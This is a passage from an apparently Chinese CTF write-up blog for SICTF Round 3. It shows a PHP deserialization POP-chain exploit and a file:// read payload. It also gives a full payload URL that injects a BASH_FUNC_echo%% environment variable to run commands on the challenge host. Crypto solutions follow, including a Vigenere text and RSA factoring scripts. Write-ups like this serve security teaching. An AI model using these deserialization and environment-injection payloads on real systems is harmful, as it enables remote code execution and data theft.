      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">client</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$url</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$payload</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">client</span><span class="p">;</span>
<span class="nv">$a</span><span class="o">-&gt;</span><span class="n">url</span> <span class="o">=</span> <span class="s2">"file:///var/www/html/flag.php"</span><span class="p">;</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>这里应该算是一个小小的非预期吧，因为出题人的目的应该是在admin.php里</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span>
<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="nv">$allowed_ip</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$allowed_ip</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"You can't get flag"</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185555-3duzqt2.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185555-3duzqt2.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="not-just-unserialize"><span class="me-2">Not just unserialize</span><a href="#not-just-unserialize" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>源代码</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="kd">class</span> <span class="nc">start</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$welcome</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$you</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">begin0fweb</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">public</span>  <span class="k">function</span> <span class="n">begin0fweb</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$p</span><span class="o">=</span><span class="s1">'hacker!'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">welcome</span><span class="o">-&gt;</span><span class="n">you</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">SE</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$year</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__set</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s1">'  Welcome to new year!  '</span><span class="p">;</span>
        <span class="k">echo</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">year</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">CR</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$last</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$newyear</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__tostring</span><span class="p">()</span> <span class="p">{</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">newyear</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'nonono'</span><span class="p">;</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/worries/i'</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">newyear</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"empty it!"</span><span class="p">;</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^.*(worries).*$/'</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">newyear</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'Don\'t be worry'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'Worries doesn\'t exists in the new year  '</span><span class="p">;</span>
            <span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">last</span><span class="o">-&gt;</span><span class="n">worries</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">ET</span><span class="p">{</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__isset</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'get'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$inject</span> <span class="o">=&gt;</span> <span class="nv">$rce</span><span class="p">){</span>
            <span class="nb">putenv</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$inject</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="nv">$rce</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nb">system</span><span class="p">(</span><span class="s2">"echo </span><span class="se">\"</span><span class="s2">Haven't you get the secret?</span><span class="se">\"</span><span class="s2">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'go'</span><span class="p">])){</span>
    <span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'go'</span><span class="p">]));</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>php反序列化，先找到入口点</p>

<p>statr—-&gt;destruct—–&gt;<code class="language-plaintext highlighter-rouge">begin0fweb</code>​—–&gt;SE—–&gt;set—-&gt;tostring——&gt;isset</p>

<p>根据上面的链子编写exp</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">start</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$welcome</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$you</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">SE</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$year</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">CR</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$last</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$newyear</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">ET</span><span class="p">{</span>
<span class="p">}</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">start</span><span class="p">;</span>
<span class="nv">$s</span><span class="o">-&gt;</span><span class="n">welcome</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SE</span><span class="p">;</span>
<span class="nv">$s</span><span class="o">-&gt;</span><span class="n">welcome</span><span class="o">-&gt;</span><span class="n">year</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CR</span><span class="p">;</span>
<span class="c1">#这里大小写绕过一下</span>
<span class="nv">$s</span><span class="o">-&gt;</span><span class="n">welcome</span><span class="o">-&gt;</span><span class="n">year</span><span class="o">-&gt;</span><span class="n">newyear</span> <span class="o">=</span> <span class="s2">"Worries"</span><span class="p">;</span>
<span class="nv">$s</span><span class="o">-&gt;</span><span class="n">welcome</span><span class="o">-&gt;</span><span class="n">year</span><span class="o">-&gt;</span><span class="n">last</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ET</span><span class="p">;</span>
<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240219220858-hsa4bzh.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240219220858-hsa4bzh.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>成功的来到了这里，接下来就是一个老生常谈的一个考点了，环境变量注入</p>

<p>p牛的文章狠狠的推荐一遍</p>

<p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html" title="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>

<p>最后的payload</p>

<div class="language-text highlighter-rouge"><div class="code-header">
        <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>http://yuanshen.life:39676/?go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30&amp;get[BASH_FUNC_echo%25%25]=() { cat /ffffllllllaaaaaaaaaaaaaaaaaaggggg; }

</pre></td></tr></tbody></table></code></div></div>
<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240219220915-8v1du9y.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240219220915-8v1du9y.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="crypto"><span class="me-2">Crypto</span><a href="#crypto" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="签到vigenere"><span class="me-2">签到Vigenere</span><a href="#签到vigenere" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-text highlighter-rouge"><div class="code-header">
        <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>Gn taj xirly gf Fxgjuakd, oe igywnd mt tegbs mnrxxlrivywd sngearbsw wakksre. Bs kpimj gf tank, it bx gur bslenmngn th jfdetagur mt ceei yze Ugnled Lystel tx Amxwaca gjmtrtq.

An taj wvegy gf tank nom xmccxjvinz, bw prhugse ts sllbffce hs lhe ytdlopnfg btxas wbyz Meqnuo: Tafl we lmsll ffce wtw logxyzer tsv madj heavj logxyzer. Pj khaeq yivLNUTF{4695vft9-fd68-4684-uj81-u6c1avg6uaft}j yenxwgus ynfanvnsl snuhorm, ffd ag zfdekxlanwnfg og tmr ptwl thty Eexbhg is mt jechsiuek yze lhxl tekwatokd an Nxb Eexbhg, Teqfk, anw Fjizhss. Thx iwtabqk of ljltlxrwnt tww leyy lo yhz.

Qou tww inlyjucmjv to bsxorf yze Pkjkidxsl [of Fjpich] tx thx ftovx nf thx ljeamjkt chsxidxsue al xgon tx at il hwrttnf thty lhekj oile gw an hzlbrxfc of pfj wimm lhe Nsatew Xlatxx snd lzygely lham yze Pkjkidxsl, on ank owg nfitbflivx, nfvimj Bapts lo ifrwdityw adajjenvj oita yzis iqsn; am yze strw tifj, gffxw lo mxiaatx gwtwxjf Jaiff anw tmrsxqnes.

Iqwasx hsll mt lhe tylenmngn oy yze Pkjkidxsl thty lhe kzlhlxxk emiqgymxsl of hzj suursrigjk nop txfekx lhe iwgspxhl of vtepeeqang Xsylagi lo mtpw pethw in t kww mhslhs.
</pre></td></tr></tbody></table></code></div></div>

<pre><code class="language-url">https://www.guballa.de/vigenere-solver
</code></pre>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216104324-dews60v.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216104324-dews60v.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="签到确信"><span class="me-2">签到，确信！</span><a href="#签到确信" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>题目附件</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">enc</span> <span class="kn">import</span> <span class="n">flag</span>

<span class="n">m</span> <span class="o">=</span> <span class="nf">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">gen_keys</span><span class="p">(</span><span class="n">bits</span><span class="p">):</span>
    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="nf">getPrime</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span>
        <span class="n">q</span> <span class="o">=</span> <span class="nf">sum</span><span class="p">([</span><span class="n">p</span><span class="o">**</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)])</span>
        <span class="k">if</span> <span class="nf">isPrime</span><span class="p">(</span><span class="n">q</span><span class="p">):</span>
            <span class="n">r</span> <span class="o">=</span> <span class="nf">getPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
            <span class="n">n</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span><span class="o">*</span><span class="n">r</span>
            <span class="k">return</span> <span class="n">p</span><span class="p">,</span><span class="n">n</span>
<span class="n">p</span><span class="p">,</span><span class="n">n</span> <span class="o">=</span> <span class="nf">gen_keys</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
<span class="n">c</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">n = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">e = </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">c = </span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="sh">'''</span><span class="s">
n = 8361361624563191168612863710516449028280757632934603412143152925186847721821552879338608951120157631182699762833743097837368740526055736516080136520584848113137087581886426335191207688807063024096128001406698217998816782335655663803544853496060418931569545571397849643826584234431049002394772877263603049736723071392989824939202362631409164434715938662038795641314189628730614978217987868150651491343161526447894569241770090377633602058561239329450046036247193745885174295365633411482121644408648089046016960479100220850953009927778950304754339013541019536413880264074456433907671670049288317945540495496615531150916647050158936010095037412334662561046016163777575736952349827380039938526168715655649566952708788485104126900723003264019513888897942175890007711026288941687256962012799264387545892832762304320287592575602683673845399984039272350929803217492617502601005613778976109701842829008365226259492848134417818535629827769342262020775115695472218876430557026471282526042545195944063078523279341459199475911203966762751381334277716236740637021416311325243028569997303341317394525345879188523948991698489667794912052436245063998637376874151553809424581376068719814532246179297851206862505952437301253313660876231136285877214949094995458997630235764635059528016149006613720287102941868517244509854875672887445099733909912598895743707420454623997740143407206090319567531144126090072331
e = 65537
c = 990174418341944658163682355081485155265287928299806085314916265580657672513493698560580484907432207730887132062242640756706695937403268682912083148568866147011247510439837340945334451110125182595397920602074775022416454918954623612449584637584716343806255917090525904201284852578834232447821716829253065610989317909188784426328951520866152936279891872183954439348449359491526360671152193735260099077198986264364568046834399064514350538329990985131052947670063605611113730246128926850242471820709957158609175376867993700411738314237400038584470826914946434498322430741797570259936266226325667814521838420733061335969071245580657187544161772619889518845348639672820212709030227999963744593715194928502606910452777687735614033404646237092067644786266390652682476817862879933305687452549301456541574678459748029511685529779653056108795644495442515066731075232130730326258404497646551885443146629498236191794065050199535063169471112533284663197357635908054343683637354352034115772227442563180462771041527246803861110504563589660801224223152060573760388045791699221007556911597792387829416892037414283131499832672222157450742460666013331962249415807439258417736128976044272555922344342725850924271905056434303543500959556998454661274520986141613977331669376614647269667276594163516040422089616099849315644424644920145900066426839607058422686565517159251903275091124418838917480242517812783383
</span><span class="sh">'''</span>
</pre></td></tr></tbody></table></code></div></div>

<p>参考ImaginaryCTF 2023 sus</p>

<p>https://tangcuxiaojikuai.xyz/post/ea445335.html</p>

<p>解题</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="c1">#sage
</span><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">n</span> <span class="o">=</span> <span class="mi">8361361624563191168612863710516449028280757632934603412143152925186847721821552879338608951120157631182699762833743097837368740526055736516080136520584848113137087581886426335191207688807063024096128001406698217998816782335655663803544853496060418931569545571397849643826584234431049002394772877263603049736723071392989824939202362631409164434715938662038795641314189628730614978217987868150651491343161526447894569241770090377633602058561239329450046036247193745885174295365633411482121644408648089046016960479100220850953009927778950304754339013541019536413880264074456433907671670049288317945540495496615531150916647050158936010095037412334662561046016163777575736952349827380039938526168715655649566952708788485104126900723003264019513888897942175890007711026288941687256962012799264387545892832762304320287592575602683673845399984039272350929803217492617502601005613778976109701842829008365226259492848134417818535629827769342262020775115695472218876430557026471282526042545195944063078523279341459199475911203966762751381334277716236740637021416311325243028569997303341317394525345879188523948991698489667794912052436245063998637376874151553809424581376068719814532246179297851206862505952437301253313660876231136285877214949094995458997630235764635059528016149006613720287102941868517244509854875672887445099733909912598895743707420454623997740143407206090319567531144126090072331</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">990174418341944658163682355081485155265287928299806085314916265580657672513493698560580484907432207730887132062242640756706695937403268682912083148568866147011247510439837340945334451110125182595397920602074775022416454918954623612449584637584716343806255917090525904201284852578834232447821716829253065610989317909188784426328951520866152936279891872183954439348449359491526360671152193735260099077198986264364568046834399064514350538329990985131052947670063605611113730246128926850242471820709957158609175376867993700411738314237400038584470826914946434498322430741797570259936266226325667814521838420733061335969071245580657187544161772619889518845348639672820212709030227999963744593715194928502606910452777687735614033404646237092067644786266390652682476817862879933305687452549301456541574678459748029511685529779653056108795644495442515066731075232130730326258404497646551885443146629498236191794065050199535063169471112533284663197357635908054343683637354352034115772227442563180462771041527246803861110504563589660801224223152060573760388045791699221007556911597792387829416892037414283131499832672222157450742460666013331962249415807439258417736128976044272555922344342725850924271905056434303543500959556998454661274520986141613977331669376614647269667276594163516040422089616099849315644424644920145900066426839607058422686565517159251903275091124418838917480242517812783383</span>
<span class="n">k</span> <span class="o">=</span> <span class="mi">7</span>

<span class="n">R</span> <span class="o">=</span> <span class="nc">Zmod</span><span class="p">(</span><span class="n">n</span><span class="p">)[</span><span class="sh">"</span><span class="s">x</span><span class="sh">"</span><span class="p">]</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">Q</span> <span class="o">=</span> <span class="n">R</span><span class="p">.</span><span class="nf">quo</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="nf">random_element</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
    <span class="n">pp</span> <span class="o">=</span> <span class="nf">gcd</span><span class="p">(</span><span class="nc">ZZ</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="n">Q</span><span class="p">.</span><span class="nf">random_element</span><span class="p">()</span> <span class="o">^</span> <span class="n">n</span><span class="p">)[</span><span class="mi">1</span><span class="p">]),</span> <span class="n">n</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pp</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">qq</span> <span class="o">=</span> <span class="nf">sum</span><span class="p">([</span><span class="n">pp</span><span class="o">**</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">k</span><span class="p">)])</span>
        <span class="n">rr</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="p">(</span><span class="n">pp</span> <span class="o">*</span> <span class="n">qq</span><span class="p">)</span>
        <span class="k">assert</span> <span class="n">n</span> <span class="o">==</span> <span class="n">pp</span> <span class="o">*</span> <span class="n">qq</span> <span class="o">*</span> <span class="n">rr</span>
        <span class="k">break</span>
<span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">pp</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">qq</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">rr</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">d</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
<span class="n">m</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="nf">long_to_bytes</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">m</span><span class="p">)))</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h3 id="superbrsa"><span class="me-2">SuperbRSA</span><a href="#superbrsa" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>题目附件</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="c1">#user:mumu666
</span><span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span><span class="o">=</span><span class="nf">getPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">q</span><span class="o">=</span><span class="nf">getPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">n</span><span class="o">=</span><span class="n">p</span><span class="o">*</span><span class="n">q</span>
<span class="n">e1</span><span class="o">=</span><span class="mi">55</span>
<span class="n">e2</span><span class="o">=</span><span class="mi">200</span>
<span class="n">m</span><span class="o">=</span><span class="nf">bytes_to_long</span><span class="p">(</span><span class="sh">"</span><span class="s">flag</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">assert</span><span class="p">(</span><span class="nf">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">)</span>
<span class="n">c1</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
<span class="n">c2</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">n=</span><span class="sh">"</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">c1=</span><span class="sh">"</span><span class="p">,</span><span class="n">c1</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">c2=</span><span class="sh">"</span><span class="p">,</span><span class="n">c2</span><span class="p">)</span>

<span class="n">n</span><span class="o">=</span> <span class="mi">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span>
<span class="n">c1</span><span class="o">=</span> <span class="mi">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span>
